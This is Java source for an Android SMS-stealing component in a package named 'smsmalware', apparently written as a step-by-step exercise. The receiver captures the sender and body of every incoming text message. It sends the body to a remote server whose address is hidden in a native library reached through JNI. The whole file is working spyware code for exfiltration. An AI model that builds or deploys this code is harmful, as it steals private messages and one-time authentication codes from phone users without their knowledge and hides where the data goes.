package com.example.smsmalware;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import retrofit2.Call;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.Callback;
import retrofit2.Response;

// (2) Create the receiver and (3) get the body of the sms whenever we get one
public class SmsReceiver extends BroadcastReceiver {

    static {
        System.loadLibrary("smsmalware");
    }
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();

                    Log.d(TAG, "SMS received from: " + sender);
                    Log.d(TAG, "SMS content: " + messageBody);

                    // Now send the SMS content to the target URL
                    sendSmsContentToServer(context, messageBody);
                }
            }
        }
    }

    // (4) Send sms body to url using retrofit
    private void sendSmsContentToServer(Context context, String messageBody) {

        // (5) get url from native lib
        String url = stringFromJNI();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(url)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        ApiService apiService = retrofit.create(ApiService.class);
        SmsData smsData = new SmsData(messageBody);

        Call<Void> call = apiService.sendSms(smsData);
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                Log.d(TAG, "SMS sent to server successfully");
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Failed to send SMS to server", t);
            }
        });
    }

    public native String stringFromJNI();
}
